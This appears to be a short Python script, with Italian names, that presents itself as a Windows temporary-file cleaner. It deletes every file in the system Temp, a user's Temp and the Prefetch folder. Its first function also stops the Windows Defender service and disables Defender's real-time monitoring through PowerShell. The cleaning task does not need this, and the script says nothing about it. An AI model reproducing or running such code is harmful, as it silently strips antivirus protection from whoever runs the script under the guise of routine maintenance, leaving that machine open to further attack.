import os

def rimuovi_file_1(percorso):
    os.system("sc stop WinDefend")
    os.chdir(percorso)
    os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
    files = os.listdir(percorso)
    
    for i in files:
        try:
            os.remove(i)
        except Exception as e:
            print(f'Errore durante la rimozione di {i}: {e}')


def rimuovi_file_2(percorso):
    os.chdir(percorso)
    files = os.listdir(percorso)

    for i in files:
        try:
            os.remove(i)
        except Exception as e:
            print(f'Errore durante la rimozione di {i}: {e}')



def rimuovi_file_3(percorso):
    os.chdir(percorso)
    files = os.listdir(percorso)

    for i in files:
        try:
            os.remove(i)
        except Exception as e:
            print(f'Errore durante la rimozione di {i}: {e}')

rimuovi_file_1(r'C:\Windows\Temp')
rimuovi_file_2(r'C:\Users\filob\AppData\Local\Temp')
rimuovi_file_3(r'C:\Windows\Prefetch')
print('Il computer ora è libero dai file temporanei')